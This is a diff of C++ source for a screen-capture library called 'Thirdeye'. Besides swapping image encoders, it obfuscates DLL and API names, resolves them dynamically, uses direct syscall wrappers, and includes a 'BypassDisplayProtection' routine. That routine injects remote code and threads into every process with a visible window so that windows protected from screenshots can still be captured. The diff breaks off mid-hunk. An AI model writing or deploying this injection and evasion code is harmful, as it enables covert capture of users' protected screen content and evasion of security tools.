@@ -2,21 +2,381 @@
 #include "internal.h"
 #include "lge_syscalls.h"
 #include "dynresolve.h"
-#include <gdiplus.h>
-#include <iostream>
-#include <sstream>
+#include <cstdio>
 #include <chrono>
-#include <mutex>
 #include <atomic>
-#include <thread>
 
-using namespace Gdiplus;
+#define TJE_IMPLEMENTATION
+#include "tiny_jpeg.h"
+extern "C" {
+#define LODEPNG_NO_COMPILE_CPP
+#include "lodepng.h"
+}
 
-static std::mutex g_GdiPlusMutex;
-static std::atomic g_ContextCount{0};
-static ULONG_PTR g_GdiplusToken = 0;
-static std::once_flag g_SyscallInitFlag;
+template <typename T>
+static T ResolveApi(HMODULE hMod, const char* name) {
+    return (T)DynGetProcAddress(hMod, name);
+}
+
+typedef HDC(WINAPI* pGetDC)(HWND);
+typedef int(WINAPI* pReleaseDC)(HWND, HDC);
+typedef HDC(WINAPI* pCreateCompatibleDC)(HDC);
+typedef HBITMAP(WINAPI* pCreateCompatibleBitmap)(HDC, int, int);
+typedef HGDIOBJ(WINAPI* pSelectObject)(HDC, HGDIOBJ);
+typedef BOOL(WINAPI* pDeleteObject)(HGDIOBJ);
+typedef BOOL(WINAPI* pDeleteDC)(HDC);
+typedef BOOL(WINAPI* pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
+typedef int(WINAPI* pGetSystemMetrics)(int);
+typedef int(WINAPI* pGetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
+
+struct CaptureApis {
+    pGetDC GetDC;
+    pReleaseDC ReleaseDC;
+    pCreateCompatibleDC CreateCompatibleDC;
+    pCreateCompatibleBitmap CreateCompatibleBitmap;
+    pSelectObject SelectObject;
+    pDeleteObject DeleteObject;
+    pDeleteDC DeleteDC;
+    pBitBlt BitBlt;
+    pGetSystemMetrics GetSystemMetrics;
+    pGetDIBits GetDIBits;
+    bool ready;
+};
+
+static const CaptureApis& GetCaptureApis() {
+    static CaptureApis a = []() {
+        CaptureApis r = {};
+        static constexpr auto obfUser32 = MAKE_OBF("user32.dll");
+        static constexpr auto obfGdi32 = MAKE_OBF("gdi32.dll");
+        HMODULE hU32 = DynGetModuleHandle(DECR_STR(obfUser32));
+        HMODULE hG32 = DynGetModuleHandle(DECR_STR(obfGdi32));
+        if (!hU32 || !hG32) return r;
+        static constexpr auto oGetDC = MAKE_OBF("GetDC");
+        static constexpr auto oReleaseDC = MAKE_OBF("ReleaseDC");
+        static constexpr auto oGetSysMet = MAKE_OBF("GetSystemMetrics");
+        static constexpr auto oCreateDC = MAKE_OBF("CreateCompatibleDC");
+        static constexpr auto oCreateBmp = MAKE_OBF("CreateCompatibleBitmap");
+        static constexpr auto oSelectObj = MAKE_OBF("SelectObject");
+        static constexpr auto oDeleteObj = MAKE_OBF("DeleteObject");
+        static constexpr auto oDeleteDC = MAKE_OBF("DeleteDC");
+        static constexpr auto oBitBlt = MAKE_OBF("BitBlt");
+        static constexpr auto oGetDIBits = MAKE_OBF("GetDIBits");
+        r.GetDC = ResolveApi<pGetDC>(hU32, DECR_STR(oGetDC));
+        r.ReleaseDC = ResolveApi<pReleaseDC>(hU32, DECR_STR(oReleaseDC));
+        r.GetSystemMetrics = ResolveApi<pGetSystemMetrics>(hU32, DECR_STR(oGetSysMet));
+        r.CreateCompatibleDC = ResolveApi<pCreateCompatibleDC>(hG32, DECR_STR(oCreateDC));
+        r.CreateCompatibleBitmap = ResolveApi<pCreateCompatibleBitmap>(hG32, DECR_STR(oCreateBmp));
+        r.SelectObject = ResolveApi<pSelectObject>(hG32, DECR_STR(oSelectObj));
+        r.DeleteObject = ResolveApi<pDeleteObject>(hG32, DECR_STR(oDeleteObj));
+        r.DeleteDC = ResolveApi<pDeleteDC>(hG32, DECR_STR(oDeleteDC));
+        r.BitBlt = ResolveApi<pBitBlt>(hG32, DECR_STR(oBitBlt));
+        r.GetDIBits = ResolveApi<pGetDIBits>(hG32, DECR_STR(oGetDIBits));
+        r.ready = r.GetDC && r.ReleaseDC && r.GetSystemMetrics && r.CreateCompatibleDC &&
+                  r.CreateCompatibleBitmap && r.SelectObject && r.DeleteObject && r.DeleteDC &&
+                  r.BitBlt && r.GetDIBits;
+        return r;
+    }();
+    return a;
+}
+
+typedef BOOL(WINAPI* pEnumWindows)(WNDENUMPROC, LPARAM);
+typedef BOOL(WINAPI* pIsWindowVisible)(HWND);
+typedef DWORD(WINAPI* pGetWindowThreadProcessId)(HWND, LPDWORD);
+
+struct WindowApis {
+    pEnumWindows EnumWindows;
+    pIsWindowVisible IsWindowVisible;
+    pGetWindowThreadProcessId GetWindowThreadProcessId;
+    bool ready;
+};
+
+static const WindowApis& GetWindowApis() {
+    static WindowApis a = []() {
+        WindowApis r = {};
+        static constexpr auto obfUser32 = MAKE_OBF("user32.dll");
+        HMODULE hU32 = DynGetModuleHandle(DECR_STR(obfUser32));
+        if (!hU32) return r;
+        static constexpr auto oEnum = MAKE_OBF("EnumWindows");
+        static constexpr auto oVisible = MAKE_OBF("IsWindowVisible");
+        static constexpr auto oThreadPid = MAKE_OBF("GetWindowThreadProcessId");
+        r.EnumWindows = ResolveApi<pEnumWindows>(hU32, DECR_STR(oEnum));
+        r.IsWindowVisible = ResolveApi<pIsWindowVisible>(hU32, DECR_STR(oVisible));
+        r.GetWindowThreadProcessId = ResolveApi<pGetWindowThreadProcessId>(hU32, DECR_STR(oThreadPid));
+        r.ready = r.EnumWindows && r.IsWindowVisible && r.GetWindowThreadProcessId;
+        return r;
+    }();
+    return a;
+}
+
+struct ByteSink {
+    uint8_t* data;
+    size_t size;
+    size_t cap;
+    bool overflow;
+
+    ByteSink() : data(nullptr), size(0), cap(0), overflow(false) {}
+    ~ByteSink() { free(data); }
+
+    bool append(const void* src, size_t n) {
+        if (overflow) return false;
+        if (size + n > cap) {
+            size_t newCap = cap ? cap * 2 : 1 << 16;
+            while (newCap < size + n) newCap *= 2;
+            uint8_t* nd = (uint8_t*)realloc(data, newCap);
+            if (!nd) { overflow = true; return false; }
+            data = nd;
+            cap = newCap;
+        }
+        memcpy(data + size, src, n);
+        size += n;
+        return true;
+    }
+};
+
+static uint8_t* ExtractBgra(const CaptureApis& cap, HDC memDC, HBITMAP hBitmap,
+                            int w, int h) {
+    size_t bytes = (size_t)w * (size_t)h * 4;
+    uint8_t* buf = (uint8_t*)malloc(bytes);
+    if (!buf) return nullptr;
+
+    BITMAPINFO bmi = {};
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = w;
+    bmi.bmiHeader.biHeight = -h; // negative -> top-down rows
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    int rows = cap.GetDIBits(memDC, hBitmap, 0, (UINT)h, buf, &bmi, DIB_RGB_COLORS);
+    if (rows != h) { free(buf); return nullptr; }
+    return buf;
+}
+
+static uint8_t* BgraToRgb(const uint8_t* bgra, int w, int h) {
+    size_t px = (size_t)w * (size_t)h;
+    uint8_t* rgb = (uint8_t*)malloc(px * 3);
+    if (!rgb) return nullptr;
+    const uint8_t* s = bgra;
+    uint8_t* d = rgb;
+    for (size_t i = 0; i < px; ++i) {
+        d[0] = s[2]; // R
+        d[1] = s[1]; // G
+        d[2] = s[0]; // B
+        s += 4;
+        d += 3;
+    }
+    return rgb;
+}
+
+static void TjeWriteCb(void* context, void* data, int size) {
+    ((ByteSink*)context)->append(data, (size_t)size);
+}
+
+static bool EncodeJpeg(const uint8_t* rgb, int w, int h, int quality, ByteSink* out) {
+    if (quality < 0) quality = 0;
+    if (quality > 100) quality = 100;
+    return tje_encode_with_func(TjeWriteCb, out, quality, w, h, 3, rgb) == 1 &&
+           !out->overflow && out->size > 0;
+}
+
+static bool EncodePng(const uint8_t* rgb, int w, int h, ByteSink* out) {
+    unsigned char* png = nullptr;
+    size_t pngSize = 0;
+    unsigned err = lodepng_encode24(&png, &pngSize, rgb, (unsigned)w, (unsigned)h);
+    if (err != 0 || !png) return false;
+    bool ok = out->append(png, pngSize);
+    free(png);
+    return ok;
+}
+
+static bool EncodeBmp(const uint8_t* bgra, int w, int h, ByteSink* out) {
+    const long pad = (long)((w * -3L) & 3);
+    const uint32_t rowSize = (uint32_t)(w * 3 + pad);
+    const uint32_t pixelBytes = rowSize * (uint32_t)h;
+    const uint32_t fileSize = 54 + pixelBytes;
+
+    uint8_t header[54] = {};
+    header[0] = 0x42; // 'B'
+    header[1] = 0x4D; // 'M'
+    header[2] = (uint8_t)(fileSize >> 0);
+    header[3] = (uint8_t)(fileSize >> 8);
+    header[4] = (uint8_t)(fileSize >> 16);
+    header[5] = (uint8_t)(fileSize >> 24);
+    header[10] = 54;                      // bfOffBits
+    header[14] = 40;                      // biSize
+    header[18] = (uint8_t)(w >> 0);
+    header[19] = (uint8_t)(w >> 8);
+    header[20] = (uint8_t)(w >> 16);
+    header[21] = (uint8_t)(w >> 24);
+    header[22] = (uint8_t)(h >> 0);       // biHeight positive -> bottom-up
+    header[23] = (uint8_t)(h >> 8);
+    header[24] = (uint8_t)(h >> 16);
+    header[25] = (uint8_t)(h >> 24);
+    header[26] = 1;                       // biPlanes
+    header[28] = 24;                      // biBitCount
+
+    if (!out->append(header, sizeof(header))) return false;
+
+    uint8_t* row = (uint8_t*)malloc(rowSize);
+    if (!row) return false;
+    for (int y = h - 1; y >= 0; --y) {
+        const uint8_t* src = bgra + (size_t)y * (size_t)w * 4;
+        uint8_t* d = row;
+        for (int x = 0; x < w; ++x) {
+            d[0] = src[0]; // B
+            d[1] = src[1]; // G
+            d[2] = src[2]; // R
+            src += 4;
+            d += 3;
+        }
+        for (long p = 0; p < pad; ++p) *d++ = 0;
+        if (!out->append(row, rowSize)) { free(row); return false; }
+    }
+    free(row);
+    return !out->overflow;
+}
+
+static bool CaptureToMemDc(ThirdeyeContext* ctx, const CaptureApis& c, int w, int h,
+                           HDC* outScreenDC, HDC* outMemDC, HBITMAP* outBmp) {
+    int x = c.GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y = c.GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    HDC hdcScreen = c.GetDC(nullptr);
+    if (!hdcScreen) {
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to get screen DC")));
+        return false;
+    }
+    HDC hdcMemDC = c.CreateCompatibleDC(hdcScreen);
+    HBITMAP hbm = c.CreateCompatibleBitmap(hdcScreen, w, h);
+    if (!hdcMemDC || !hbm) {
+        if (hbm) c.DeleteObject(hbm);
+        if (hdcMemDC) c.DeleteDC(hdcMemDC);
+        c.ReleaseDC(nullptr, hdcScreen);
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to create capture surface")));
+        return false;
+    }
+    c.SelectObject(hdcMemDC, hbm);
+    if (!c.BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY)) {
+        c.DeleteObject(hbm);
+        c.DeleteDC(hdcMemDC);
+        c.ReleaseDC(nullptr, hdcScreen);
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("BitBlt failed during screen capture")));
+        return false;
+    }
+    *outScreenDC = hdcScreen;
+    *outMemDC = hdcMemDC;
+    *outBmp = hbm;
+    return true;
+}
+
+static bool CaptureEncoded(ThirdeyeContext* ctx, const ThirdeyeOptions& opts, ByteSink* out) {
+    const CaptureApis& c = GetCaptureApis();
+    if (!c.ready) {
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Capture API unavailable")));
+        return false;
+    }
+
+    int w = c.GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int h = c.GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    HDC hdcScreen = nullptr, hdcMemDC = nullptr;
+    HBITMAP hbm = nullptr;
+    if (!CaptureToMemDc(ctx, c, w, h, &hdcScreen, &hdcMemDC, &hbm)) return false;
+
+    uint8_t* bgra = ExtractBgra(c, hdcMemDC, hbm, w, h);
+    c.DeleteObject(hbm);
+    c.DeleteDC(hdcMemDC);
+    c.ReleaseDC(nullptr, hdcScreen);
+
+    if (!bgra) {
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to read bitmap pixels")));
+        return false;
+    }
+
+    bool ok = false;
+    if (opts.format == THIRDEYE_FORMAT_BMP) {
+        ok = EncodeBmp(bgra, w, h, out);
+    } else {
+        uint8_t* rgb = BgraToRgb(bgra, w, h);
+        if (rgb) {
+            if (opts.format == THIRDEYE_FORMAT_PNG) {
+                ok = EncodePng(rgb, w, h, out);
+            } else { // JPEG default
+                ok = EncodeJpeg(rgb, w, h, opts.quality, out);
+            }
+            free(rgb);
+        }
+    }
+    free(bgra);
+
+    if (!ok) {
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to encode image")));
+    }
+    return ok;
+}
+
+static INIT_ONCE g_SyscallInitOnce = INIT_ONCE_STATIC_INIT;
 static bool g_SyscallInitResult = false;
+
+static BOOL CALLBACK SyscallInitOnceCallback(PINIT_ONCE, PVOID, PVOID*) {
+    g_SyscallInitResult = InitializeSyscalls();
+    return TRUE;
+}
+
+#define MAX_PROCESSES 128
+#define MAX_INJECTIONS 128
+
+struct ProcessHwnds {
+    DWORD pid;
+    DWORD count;
+    HWND hwnds[MAX_HWNDS_PER_PID];
+};
+
+struct ProcessWindowSet {
+    size_t count;
+    ProcessHwnds entries[MAX_PROCESSES];
+};
+
+struct InjectionList {
+    size_t count;
+    RemoteContext items[MAX_INJECTIONS];
+};
+
+static void CleanupInjections(RemoteContext* injections, size_t count);
+struct CleanupThreadArg {
+    RemoteContext* items;
+    size_t count;
+};
+static DWORD WINAPI CleanupThreadProc(LPVOID param) {
+    auto* arg = (CleanupThreadArg*)param;
+    CleanupInjections(arg->items, arg->count);
+    free(arg->items);
+    free(arg);
+    return 0;
+}
+static void StartCleanupThread(const RemoteContext* items, size_t count) {
+    if (count == 0) return;
+    auto* copy = (RemoteContext*)malloc(count * sizeof(RemoteContext));
+    if (!copy) {
+        CleanupInjections(const_cast<RemoteContext*>(items), count);
+        return;
+    }
+    memcpy(copy, items, count * sizeof(RemoteContext));
+    auto* arg = (CleanupThreadArg*)malloc(sizeof(CleanupThreadArg));
+    if (!arg) {
+        free(copy);
+        CleanupInjections(const_cast<RemoteContext*>(items), count);
+        return;
+    }
+    arg->items = copy;
+    arg->count = count;
+    HANDLE h = CreateThread(nullptr, 0, CleanupThreadProc, arg, 0, nullptr);
+    if (h) {
+        CloseHandle(h);
+    } else {
+        CleanupThreadProc(arg);
+    }
+}
 
 void SetLastErrorMsg(ThirdeyeContext* ctx, const char* msg) {
     if (ctx) {
@@ -29,7 +389,7 @@ HMODULE GetNtdllHandle() {
     static HMODULE hNtdll = nullptr;
     if (!hNtdll) {
         static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
-        hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll).c_str());
+        hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll));
     }
     return hNtdll;
 }
@@ -175,6 +535,7 @@ DWORD NtWaitDirect(HANDLE handle, DWORD milliseconds) {
 #pragma runtime_checks( "", off )
 #pragma optimize( "", off )
 #pragma check_stack( off )
+#pragma code_seg(push, remote_seg, REMOTE_SECTION_NAME)
 #endif
 
 extern "C" SEC_REMOTE FUNC_ATTRS
@@ -379,58 +740,26 @@ DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
     return 0;
 }
 
+#ifdef __GNUC__
+extern "C" SEC_REMOTE FUNC_ATTRS __attribute__((used))
+#else
+extern "C" SEC_REMOTE FUNC_ATTRS
+#endif
+void __stdcall RemoteThreadProcEnd() {}
+
 #ifndef __GNUC__
+#pragma code_seg(pop, remote_seg)
 #pragma runtime_checks( "", restore )
 #pragma optimize( "", on )
 #pragma check_stack( on )
 #endif
 
-static HMODULE GetSelfModuleHandle() {
-    HMODULE hMod = nullptr;
-    if (!GetModuleHandleExA(
-            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-            (LPCSTR)&GetSelfModuleHandle,
-            &hMod)) {
-        return nullptr;
-    }
-    return hMod;
-}
-
 size_t GetRemoteSectionSize() {
-    HMODULE hMod = GetSelfModuleHandle();
-    if (!hMod) {
-        return 0;
-    }
-
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;
-    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDosHeader->e_lfanew);
-    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
-
-    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-        if (strncmp((char*)pSectionHeader[i].Name, REMOTE_SECTION_NAME, 8) == 0) {
-            size_t size = pSectionHeader[i].Misc.VirtualSize;
-            return (size + 4095) & ~4095;
-        }
-    }
-    return 0;
-}
-
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
-    UINT num = 0, size = 0;
-    GetImageEncodersSize(&num, &size);
-    if (size == 0) return -1;
-    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
-    if (!pImageCodecInfo) return -1;
-    GetImageEncoders(num, size, pImageCodecInfo);
-    for (UINT j = 0; j < num; ++j) {
-        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
-            *pClsid = pImageCodecInfo[j].Clsid;
-            free(pImageCodecInfo);
-            return j;
-        }
-    }
-    free(pImageCodecInfo);
-    return -1;
+    uintptr_t start = (uintptr_t)&RemoteThreadProc;
+    uintptr_t end = (uintptr_t)&RemoteThreadProcEnd;
+    if (end <= start) return 0;
+    size_t size = end - start;
+    return (size + 15) & ~((size_t)15);
 }
 
 typedef DWORD(NTAPI* pNtUserGetWDA)(HWND, DWORD*);
@@ -439,15 +768,18 @@ static pNtUserGetWDA GetNtUserGetWDA() {
     static pNtUserGetWDA fn = []() -> pNtUserGetWDA {
         static constexpr auto obfWin32u = MAKE_OBF("win32u.dll");
         static constexpr auto obfGetWDA = MAKE_OBF("NtUserGetWindowDisplayAffinity");
-        HMODULE h = DynGetModuleHandle(DECR_STR(obfWin32u).c_str());
+        HMODULE h = DynGetModuleHandle(DECR_STR(obfWin32u));
         if (!h) return nullptr;
-        return (pNtUserGetWDA)DynGetProcAddress(h, DECR_STR(obfGetWDA).c_str());
+        return (pNtUserGetWDA)DynGetProcAddress(h, DECR_STR(obfGetWDA));
     }();
     return fn;
 }
 
 static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
-    if (!IsWindowVisible(hwnd)) return TRUE;
+    auto* pw = (ProcessWindowSet*)lParam;
+    const WindowApis& w = GetWindowApis();
+    if (!w.ready) return TRUE;
+    if (!w.IsWindowVisible(hwnd)) return TRUE;
 
     pNtUserGetWDA fnGetWDA = GetNtUserGetWDA();
     if (fnGetWDA) {
@@ -457,13 +789,22 @@ static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
         }
     }
 
-    auto* processWindows = (std::map<DWORD, std::vector<HWND>>*)lParam;
     DWORD pid = 0;
-    GetWindowThreadProcessId(hwnd, &pid);
-    if (pid != GetCurrentProcessId()) {
-        if ((*processWindows)[pid].size() < MAX_HWNDS_PER_PID) {
-            (*processWindows)[pid].push_back(hwnd);
-        }
+    w.GetWindowThreadProcessId(hwnd, &pid);
+    if (pid == GetCurrentProcessId()) return TRUE;
+
+    ProcessHwnds* slot = nullptr;
+    for (size_t i = 0; i < pw->count; ++i) {
+        if (pw->entries[i].pid == pid) { slot = &pw->entries[i]; break; }
+    }
+    if (!slot) {
+        if (pw->count >= MAX_PROCESSES) return TRUE;
+        slot = &pw->entries[pw->count++];
+        slot->pid = pid;
+        slot->count = 0;
+    }
+    if (slot->count < MAX_HWNDS_PER_PID) {
+        slot->hwnds[slot->count++] = hwnd;
     }
     return TRUE;
 }
@@ -472,10 +813,9 @@ static bool IsProcessBlacklisted(DWORD pid) {
     return pid <= 4;
 }
 
-static void CleanupInjections(std::vector<RemoteContext>& injections) {
-    if (injections.empty()) return;
-
-    for (const auto& ctx : injections) {
+static void CleanupInjections(RemoteContext* injections, size_t count) {
+    for (size_t i = 0; i < count; ++i) {
+        const RemoteContext& ctx = injections[i];
         if (ctx.hThread) {
             if (NtWaitDirect(ctx.hThread, 200) == WAIT_OBJECT_0) {
                 if (ctx.pRemoteCode) NtFreeMemoryDirect(ctx.hProcess, ctx.pRemoteCode);
@@ -483,15 +823,18 @@ static void CleanupInjections(std::vector<RemoteContext>& injections) {
             }
             NtCloseDirect(ctx.hThread);
         }
-
         if (ctx.hProcess) NtCloseDirect(ctx.hProcess);
     }
-    injections.clear();
 }
 
-static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger, std::vector<RemoteContext>& activeInjections) {
-    std::map<DWORD, std::vector<HWND>> processWindows;
-    EnumWindows(EnumWindowsProc, (LPARAM)&processWindows);
+static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger, InjectionList& activeInjections) {
+    ProcessWindowSet pw = {};
+    const WindowApis& w = GetWindowApis();
+    if (!w.ready) {
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Window APIs unavailable")));
+        return false;
+    }
+    w.EnumWindows(EnumWindowsProc, (LPARAM)&pw);
     size_t skippedBlacklisted = 0;
     size_t openFailed = 0;
     size_t opened = 0;
@@ -517,7 +860,9 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
         return false;
     }
 
-    for (auto const& [pid, hwnds] : processWindows) {
+    for (size_t e = 0; e < pw.count; ++e) {
+        const ProcessHwnds& pwEntry = pw.entries[e];
+        DWORD pid = pwEntry.pid;
         if (IsProcessBlacklisted(pid)) {
             skippedBlacklisted++;
             continue;
@@ -531,8 +876,8 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
         opened++;
 
         INJECTION_DATA data = { 0 };
-        data.count = hwnds.size() < MAX_HWNDS_PER_PID ? (DWORD)hwnds.size() : MAX_HWNDS_PER_PID;
-        for (size_t i = 0; i < data.count; i++) data.hwnds[i] = hwnds[i];
+        data.count = pwEntry.count < MAX_HWNDS_PER_PID ? pwEntry.count : MAX_HWNDS_PER_PID;
+        for (size_t i = 0; i < data.count; i++) data.hwnds[i] = pwEntry.hwnds[i];
 
         static constexpr auto obfKernel32 = MAKE_OBF("kernel32.dll");
         static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
@@ -620,133 +965,63 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
             continue;
         }
 
-        activeInjections.push_back({ hProcess, hThread, pRemoteData, pRemoteCode, pid });
+        if (activeInjections.count < MAX_INJECTIONS) {
+            RemoteContext& slot = activeInjections.items[activeInjections.count++];
+            slot.hProcess = hProcess;
+            slot.hThread = hThread;
+            slot.pRemoteData = pRemoteData;
+            slot.pRemoteCode = pRemoteCode;
+            slot.pid = pid;
+        } else {
+            if (NtWaitDirect(hThread, 200) == WAIT_OBJECT_0) {
+                NtFreeMemoryDirect(hProcess, pRemoteCode);
+                NtFreeMemoryDirect(hProcess, pRemoteData);
+            }
+            NtCloseDirect(hThread);
+            NtCloseDirect(hProcess);
+        }
     }
 
-    if (!activeInjections.empty()) {
-        for (size_t i = 0; i < activeInjections.size(); i++) {
+    if (activeInjections.count > 0) {
+        for (size_t i = 0; i < activeInjections.count; i++) {
             WaitForSingleObject(hReadySemaphore.get(), 150);
         }
     }
 
 #if defined(_DEBUG) || defined(THIRDEYE_DEBUG)
-    std::ostringstream msg;
-    msg << "bypass_diag processes=" << processWindows.size()
-        << " skipped_blacklisted=" << skippedBlacklisted
-        << " opened=" << opened
-        << " injections=" << activeInjections.size()
-        << " open_failed=" << openFailed
-        << " duplicate_failed=" << duplicateFailed
-        << " allocation_failed=" << allocationFailed
-        << " write_failed=" << writeFailed
-        << " thread_failed=" << threadFailed
-        << " section_size=" << sectionSize;
-    SetLastErrorMsg(ctx, msg.str().c_str());
+    char msg[256];
+    snprintf(msg, sizeof(msg),
+        "bypass_diag processes=%zu skipped_blacklisted=%zu opened=%zu injections=%zu "
+        "open_failed=%zu duplicate_failed=%zu allocation_failed=%zu write_failed=%zu "
+        "thread_failed=%zu section_size=%zu",
+        pw.count, skippedBlacklisted, opened, activeInjections.count,
+        openFailed, duplicateFailed, allocationFailed, writeFailed, threadFailed, sectionSize);
+    msg[sizeof(msg) - 1] = '\0';
+    SetLastErrorMsg(ctx, msg);
 #endif
 
     return true;
-}
-
-static const WCHAR* GetMimeType(ThirdeyeFormat format) {
-    switch (format) {
-        case THIRDEYE_FORMAT_PNG: return L"image/png";
-        case THIRDEYE_FORMAT_BMP: return L"image/bmp";
-        case THIRDEYE_FORMAT_JPEG:
-        default: return L"image/jpeg";
-    }
-}
-
-static ThirdeyeResult CaptureScreenToStream(ThirdeyeContext* ctx, IStream* stream, const ThirdeyeOptions* opts) {
-    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-
-    HDC hdcScreen = GetDC(nullptr);
-    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
-    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
-    SelectObject(hdcMemDC, hbm);
-
-    BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY);
-
-    Bitmap bitmap(hbm, nullptr);
-
-    CLSID clsid;
-    const WCHAR* mimeType = GetMimeType(opts ? opts->format : THIRDEYE_FORMAT_JPEG);
-    if (GetEncoderClsid(mimeType, &clsid) == -1) {
-        DeleteObject(hbm);
-        DeleteDC(hdcMemDC);
-        ReleaseDC(nullptr, hdcScreen);
-        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Image encoder not found")));
-        return THIRDEYE_ERROR_ENCODER_NOT_FOUND;
-    }
-
-    EncoderParameters encoderParams;
-    ULONG quality = opts ? (ULONG)opts->quality : 90;
-
-    if (opts && opts->format == THIRDEYE_FORMAT_JPEG) {
-        encoderParams.Count = 1;
-        encoderParams.Parameter[0].Guid = EncoderQuality;
-        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
-        encoderParams.Parameter[0].NumberOfValues = 1;
-        encoderParams.Parameter[0].Value = &quality;
-        bitmap.Save(stream, &clsid, &encoderParams);
-    } else {
-        bitmap.Save(stream, &clsid, nullptr);
-    }
-
-    DeleteObject(hbm);
-    DeleteDC(hdcMemDC);
-    ReleaseDC(nullptr, hdcScreen);
-
-    return THIRDEYE_OK;
 }
 
 THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CreateContext(ThirdeyeContext** ppContext) {
     if (!ppContext) return THIRDEYE_ERROR_INVALID_PARAM;
     *ppContext = nullptr;
 
-    std::call_once(g_SyscallInitFlag, []() {
-        g_SyscallInitResult = InitializeSyscalls();
-    });
+    InitOnceExecuteOnce(&g_SyscallInitOnce, SyscallInitOnceCallback, nullptr, nullptr);
 
     if (!g_SyscallInitResult) {
         return THIRDEYE_ERROR_SYSCALL_INIT_FAILED;
     }
 
-    {
-        std::lock_guard lock(g_GdiPlusMutex);
-        if (g_ContextCount == 0) {
-            GdiplusStartupInput gdiplusStartupInput;
-            if (GdiplusStartup(&g_GdiplusToken, &gdiplusStartupInput, nullptr) != Ok) {
-                return THIRDEYE_ERROR_GDIPLUS_INIT_FAILED;
-            }
-        }
-        g_ContextCount++;
-    }
-
-    ThirdeyeContext* ctx = new ThirdeyeContext();
-    memset(ctx->lastError, 0, sizeof(ctx->lastError));
+    ThirdeyeContext* ctx = (ThirdeyeContext*)calloc(1, sizeof(ThirdeyeContext));
+    if (!ctx) return THIRDEYE_ERROR_ALLOCATION_FAILED;
     *ppContext = ctx;
     return THIRDEYE_OK;
 }
 
 THIRDEYE_API void THIRDEYE_CALL Thirdeye_DestroyContext(ThirdeyeContext* context) {
     if (!context) return;
-
-    {
-        std::lock_guard lock(g_GdiPlusMutex);
-        g_ContextCount--;
-        if (g_ContextCount <= 0) {
-            g_ContextCount = 0;
-            if (g_GdiplusToken) {
-                GdiplusShutdown(g_GdiplusToken);
-                g_GdiplusToken = 0;
-            }
-        }
-    }
-
-    delete context;
+    free(context);
 }
 
 THIRDEYE_API void THIRDEYE_CALL Thirdeye_GetDefaultOptions(ThirdeyeOptions* options) {
@@ -776,7 +1051,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
     }
 
     HandleGuard hGlobalTrigger;
-    std::vector<RemoteContext> injections;
+    InjectionList injections = {};
     if (opts.bypassProtection) {
         hGlobalTrigger = HandleGuard(CreateEventA(nullptr, TRUE, FALSE, nullptr));
         if (hGlobalTrigger) {
@@ -784,56 +1059,28 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
         }
     }
 
-    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-
-    HDC hdcScreen = GetDC(nullptr);
-    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
-    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
-    SelectObject(hdcMemDC, hbm);
-
